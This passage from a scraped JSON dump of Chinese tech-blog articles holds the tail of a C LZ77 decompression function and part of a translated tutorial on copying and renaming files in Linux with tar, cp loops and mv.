id=\"crayon-5b4d7bc4732a6740937600-303\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">orig</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-304\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-305\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">else</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-306\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-307\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">orig</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-e\">malloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-308\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-309\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-310\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">opos</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-311\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">opos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-312\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-313\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*在前向缓冲区中记录当前字符*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-314\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-315\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-316\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*调整剩余数量*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-317\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-318\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-319\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*设置短语长度为1*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-320\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-321\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-322\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*复制前向缓冲中的数据到滑动窗口*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-323\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">memmove</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">LZ7_WINDOW_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-324\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">memmove</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-325\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-326\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*指向原始数据缓冲区*/</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-327\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">original</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-328\"> </div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-329\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*返回解压缩的原始数据中的字节数*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7bc4732a6740937600-330\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">opos</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7bc4732a6740937600-331\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0732 seconds] -->\r\n<p></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114214\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114214votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114214\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>"], "tags": "IT技术,LZ77,数据压缩", "author": "IDreamo", "front_image_path": "full/8c38398f296a7779190d5d6669e90e1476ae113d.jpg"}
{"title": "在 Linux 上复制和重命名文件", "createdate": "2018/06/23", "url": "http://blog.jobbole.com/114148/", "url_object_id": "4c1a5cd279328306ee9d94cacae94409", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "thumbs": 1, "bookmark": 1, "comments": null, "contents": ["<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.networkworld.com/article/3276349/linux/copying-and-renaming-files-on-linux.html\">Sandra Henry-stocker</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9772-1.html\">Linux中国/geekpi</a>   </div><blockquote><p>cp 和 mv 之外，在 Linux 上有更多的复制和重命名文件的命令。试试这些命令或许会惊艳到你，并能节省一些时间。</p></blockquote>\n<p>Linux 用户数十年来一直在使用简单的 <code>cp</code> 和 <code>mv</code> 命令来复制和重命名文件。这些命令是我们大多数人首先学到的，每天可能有数百万人在使用它们。但是还有其他技术、方便的方法和另外的命令，这些提供了一些独特的选项。</p>\n<p>首先，我们来思考为什么你想要复制一个文件。你可能需要在另一个位置使用同一个文件，或者因为你要编辑该文件而需要一个副本，并且希望确保备有便利的备份以防万一需要恢复原始文件。这样做的显而易见的方式是使用像 <code>cp myfile myfile-orig</code> 这样的命令。</p>\n<p>但是，如果你想复制大量的文件，那么这个策略可能就会变得很老。更好的选择是：</p>\n<ul>\n<li>在开始编辑之前，使用 <code>tar</code> 创建所有要备份的文件的存档。</li>\n<li>使用 <code>for</code> 循环来使备份副本更容易。</li>\n</ul>\n<p>使用 <code>tar</code> 的方式很简单。对于当前目录中的所有文件，你可以使用如下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a47950ed917972935\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tar cf myfiles.tar *\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47950ed917972935-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47950ed917972935-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a47950ed917972935-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tar </span><span class=\"crayon-e\">cf </span><span class=\"crayon-v\">myfiles</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e \">tar *</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47950ed917972935-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>对于一组可以用模式标识的文件，可以使用如下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a47950f9025464166\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tar cf myfiles.tar *.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47950f9025464166-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47950f9025464166-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a47950f9025464166-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tar </span><span class=\"crayon-e\">cf </span><span class=\"crayon-v\">myfiles</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e \">tar *</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47950f9025464166-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>在每种情况下，最终都会生成一个 <code>myfiles.tar</code> 文件，其中包含目录中的所有文件或扩展名为 .txt 的所有文件。</p>\n<p>一个简单的循环将允许你使用修改后的名称来制作备份副本：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a47950ff647795089\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ for file in *\r\n&gt; do\r\n&gt; cp $file $file-orig\r\n&gt; done\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47950ff647795089-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47950ff647795089-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47950ff647795089-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a47950ff647795089-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a47950ff647795089-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a47950ff647795089-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47950ff647795089-2\"><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">do</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47950ff647795089-3\"><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cp</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">file</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">orig</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a47950ff647795089-4\"><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">done</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a47950ff647795089-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>当你备份单个文件并且该文件恰好有一个长名称时，可以依靠使用 <code>tab</code> 来补全文件名（在输入足够的字母以便唯一标识该文件后点击 <code>Tab</code> 键）并使用像这样的语法将 <code>-orig</code> 附加到副本的名字后。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a4795104646176074\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cp file-with-a-very-long-name{,-orig}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a4795104646176074-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a4795104646176074-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a4795104646176074-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cp</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">with</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">a</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">very</span><span class=\"crayon-o\">-</span><span class=\"crayon-t\">long</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">name</span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a4795104646176074-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>然后你有一个 <code>file-with-a-very-long-name</code> 和一个 <code>file-with-a-very-long-name-orig</code>。</p>\n<h3 id=\"toc_1\">在 Linux 上重命名文件</h3>\n<p>重命名文件的传统方法是使用 <code>mv</code> 命令。该命令将文件移动到不同的目录，或原地更改其名称，或者同时执行这两个操作。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a4795109245014251\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mv myfile /tmp\r\n$ mv myfile notmyfile\r\n$ mv myfile /tmp/notmyfile\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a4795109245014251-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a4795109245014251-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a4795109245014251-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a4795109245014251-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a4795109245014251-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mv </span><span class=\"crayon-v\">myfile</span><span class=\"crayon-h\"> 